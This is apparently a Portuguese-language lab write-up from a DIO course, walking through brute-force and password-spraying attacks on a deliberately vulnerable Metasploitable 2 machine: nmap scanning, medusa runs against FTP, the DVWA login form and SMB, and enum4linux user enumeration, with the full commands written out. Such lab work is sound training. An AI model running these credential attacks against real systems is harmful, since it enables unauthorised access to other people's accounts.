# images
Laboratório Público DIO

Invasão ao sistema FTP na máquina Metasploitable 2

Primeiro descubro o ip da máquina Metasploitable 2 que no meu caso é 192.168.110.129 com o comando ip a
Depois rodamos o comando do nmap -sV -p 21,22,80,445,139 192.168.110.229 e verificamos que a porta 21 tcp está aberta
Vamos criar um arquivo em txt com os nomes de usuários e senhas.
Usuários - echo -e "user\nmsfadmin\nadmin\nroot" > users.txt.
Senhas -   echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt.
Depois executo o medusa com o seguinte comando medusa -h 192.168.110.129 -U users.txt -P pass.txt -M ftp -t 6, descobrindo que o login é admin e a senha password.
agora logo no ftp com o comando dentro do Kali Linux ftp 192.168.110.129 com o login admin e a senha password conseguindo acesso ao FTP.

Invasão ao Sistema DVWA 

Para acessar o sistema dvwa pelo browser basta digitar o número da máquina metasploitable seguido de /dvwa
Apenas para teste tentei o login luiz e a senha luiz e abri as ferramentas de desenvolvedor fui em network, em post no codigo 302 cliquei em Request onde aparece o username, senha e Login 
Fiz um script para invadir o sistema de login e senha do site dvwa, utilizando os arquivos de texto users.txt e pass.txt
Foi utilizado o script medusa -h 192.168.110.129 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php'
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 1 
Conseguindo o login user com a senha 123456
Colocando este usuário e senha consegui entrar no DVWA.

Invasão ao SMB 

Fiz o script enum4linux -a 192.168.110.129 | tee enum4_output.txt para conseguirmos os nomes de usuários que estão na rede smb da maquina mestasploitable.
Depois abrimos o arquivo enum4_output.txt para termos os nomes de usuários
Fiz novas wordlists com os nomes de usuários e senhas
Usuários - echo -e "user\nmsfadmin\nservice" > smb_users.txt
Senhas   - echo -e "password\n123456\n\Welcome123\nmsfadmin" > senhas_spray.txt
Executo outro script da ferramenta medusa para testar as senhas com vários usuários e conseguimos resultado com o login msfadmin e a senha msfadmin o login de administrador
Script Medusa medusa -h 192.168.110.129 -U smb_users.txt -p senhas_spray.txt -M smbnt -t 2  -T 50
Para acessar o SMB utilizo o script smbclient -L //192.168.110.129 -U msfadmin e na senha coloco msfadmin e tenho acesso ao SMB.

